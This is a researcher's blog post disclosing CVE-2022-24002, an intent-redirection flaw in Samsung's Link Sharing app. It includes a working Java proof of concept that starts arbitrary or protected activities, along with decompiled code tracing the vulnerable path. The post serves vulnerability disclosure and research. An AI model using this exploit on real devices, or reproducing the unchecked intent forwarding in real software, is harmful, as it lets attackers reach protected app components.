---
layout: post
title:  "CVE-2022-24002 - Samsung Link Sharing Start Any Activity"
date:   2022-02-11 10:00:00 -0500
categories: research
tags: bug collision
---

In 2021, as part of my research for Austin Pwn2Own 2021, I found a bug where the Link Sharing application could be abused to start either:

* Any exported activity
* Any protected activity within the Link Sharing application

I submitted this bug to Samsung but they said someone else already reported it. Today Samsung publicly disclosed the CVE ID for this issue, and credit goes to Dawuge of Pangu Team. I guess it is safe for me to disclose my PoC for it:

```
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.samsung.android.app.simplesharing", "com.samsung.android.app.simplesharing.presentation.precondition.PreconditionActivity"));

Intent intent2 = new Intent();
intent2.setComponent(new ComponentName("com.sec.android.app.sbrowser", "com.sec.android.app.sbrowser.SBrowserLauncherActivity")); // replace with any other target component
intent2.setData(Uri.parse("https://www.f-secure.com"));
intent2.putExtra("yay", "boo");

Bundle bundle = new Bundle();
bundle.putInt("extra_request_code", 9001);
bundle.putParcelable("extra_former_intent", intent2);

intent.putExtras(bundle);

startActivity(intent);
```

## Technical Details

When `PreConditionActivity` is opened, the Intent is passed onto `com.samsung.android.app.simplesharing.presentation.precondition.PreconditionViewModel.handlePrecondition(intent)`:

```
package com.samsung.android.app.simplesharing.presentation.precondition;

public final class PreconditionActivity extends AppCompatActivity {

    public void onCreate(Bundle bundle) {
        AndroidInjection.inject(this);
        ...
        PreconditionViewModel viewModel = getViewModel();
        ...
        viewModel.handlePrecondition(intent);
    }

    public final PreconditionViewModel getViewModel() {
        return (PreconditionViewModel) this.viewModel$delegate.getValue();
    }
```
The Intent is processed, and the parcelable extra `extra_former_intent` is stored in the variable `formerIntent`. This variable can then be called via the method `getFormerIntent()`:

```
package com.samsung.android.app.simplesharing.presentation.precondition;

public final class PreconditionViewModel extends AndroidViewModel {

    private Intent formerIntent;

    public final void handlePrecondition(Intent intent) {
        if (!this.isInit) {
            this.isInit = true;
            if (isFromSdk(intent)) {
                this.callerType = CallerType.TYPE_SDK;
                if (enforceShowPermissionNotice()) {
                    setShouldEnforceShowPermissionNotice();
                } else {
                    setShouldRequestPermission();
                }
            } else if (isOptionalContactRequest(intent)) {
                setShouldRequestContactPermission();
            } else if (isOptionalCameraRequest(intent)) {
                setShouldRequestCameraPermission();
            } else {
                Intent intent2 = (Intent) intent.getParcelableExtra("extra_former_intent");
                this.formerIntent = intent2;
                ...
    }

    public final Intent getFormerIntent() {
        return this.formerIntent;
    }
```

Going back to the class `com.samsung.android.app.simplesharing.presentation.precondition.PreconditionActivity`, the method `startFormalIntentActivity()` is called which then retrieves the variable `formerIntent` via `getFormerIntent()`, and then calls class `com.samsung.android.app.simplesharing.presentation.common.util.NavigatorUtil` method `startActivityFromFormerIntent(Activity, Intent)`:

```
package com.samsung.android.app.simplesharing.presentation.precondition;

public final class PreconditionActivity extends AppCompatActivity {

    public final void startFormalIntentActivity() {
        if (getViewModel().isProcessRestart()) {
            NavigatorUtil.startHistoryActivity$default(NavigatorUtil.INSTANCE, this, false, null, 6, null);
        } else {
            Intent formerIntent = getViewModel().getFormerIntent();
            if (formerIntent != null) {
                NavigatorUtil.INSTANCE.startActivityFromFormerIntent(this, formerIntent);
            }
        }
        finishWithSuccess();
    }
```

The `formerIntent` is finally passed to `startActivity(Activity, Intent)`, where the component in the `formerIntent` is used to start a new activity:

```
package com.samsung.android.app.simplesharing.presentation.common.util;

public final class NavigatorUtil {

    public final void startActivityFromFormerIntent(Activity activity, Intent intent) {
        Intent copyIntent = copyIntent(intent);
        if (intent.getClipData() != null) {
            copyIntent.setClipData(intent.getClipData());
            copyIntent.addFlags(1);
        }
        INSTANCE.startActivity(activity, copyIntent);
    }
```